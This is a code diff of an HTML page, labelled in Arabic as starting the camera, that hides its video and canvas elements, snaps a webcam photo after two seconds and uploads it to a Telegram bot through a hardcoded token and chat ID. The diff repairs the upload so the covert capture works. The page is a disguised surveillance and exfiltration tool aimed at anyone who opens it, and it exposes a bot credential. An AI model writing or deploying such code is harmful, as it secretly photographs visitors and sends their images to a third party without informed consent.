@@ -1,59 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Auto Capture</title>
+  <meta charset="UTF-8">
+  <title>Camera Auto Capture</title>
 </head>
 <body>
-  <h2>جاري تشغيل الكاميرا...</h2>
-  <video id="video" autoplay playsinline style="display: none;"></video>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <h2>جاري تشغيل الكاميرا...</h2>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-    // تشغيل الكاميرا
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+    function dataURLtoBlob(dataurl) {
+      var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--){
+          u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], {type:mime});
+    }
 
-        // انتظر 2 ثانية ثم التقط صورة
-        setTimeout(() => {
-          const context = canvas.getContext('2d');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // تشغيل الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
 
-          const imageData = canvas.toDataURL('image/png');
+        // انتظر 2 ثانية ثم التقط صورة
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // تحويل Base64 إلى Blob ثم إرساله
-          fetch(imageData)
-            .then(res => res.blob())
-            .then(blob => {
-              const formData = new FormData();
-              formData.append('5568171362', '6191654815:AAGuLV94DlfXAMgGukJDzoDRpFiNFD6RXqg'); // Chat ID
-              formData.append('photo', blob, 'photo.png');
+          const imageData = canvas.toDataURL('image/png');
+          const blob = dataURLtoBlob(imageData);
 
-              fetch('https://api.telegram.org/bot6191654815:AAGuLV94DlfXAMgGukJDzoDRpFiNFD6RXqg/sendPhoto', {
-                method: 'POST',
-                body: formData
-              })
-              .then(response => response.json())
-              .then(data => {
-                console.log('✅ تم الإرسال:', data);
-                alert('✅ تم إرسال الصورة إلى تيليجرام!');
-              })
-              .catch(error => {
-                console.error('❌ خطأ في الإرسال:', error);
-                alert('❌ فشل إرسال الصورة: ' + error.message);
-              });
-            });
-        }, 2000);
-      })
-      .catch(err => {
-        alert('🚫 رفض الوصول إلى الكاميرا: ' + err.message);
-      });
-  </script>
+          const formData = new FormData();
+          formData.append('chat_id', '5568171362'); // Chat ID
+          formData.append('photo', blob, 'photo.png');
+
+          fetch('https://api.telegram.org/bot6191654815:AAGuLV94DlfXAMgGukJDzoDRpFiNFD6RXqg/sendPhoto', {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('✅ تم الإرسال:', data);
+            alert('✅ تم إرسال الصورة إلى تيليجرام!');
+          })
+          .catch(error => {
+            console.error('❌ خطأ في الإرسال:', error);
+            alert('❌ فشل إرسال الصورة: ' + error.message);
+          });
+
+        }, 2000);
+      })
+      .catch(err => {
+        alert('🚫 رفض الوصول إلى الكاميرا: ' + err.message);
+      });
+  </script>
 </body>
 </html>
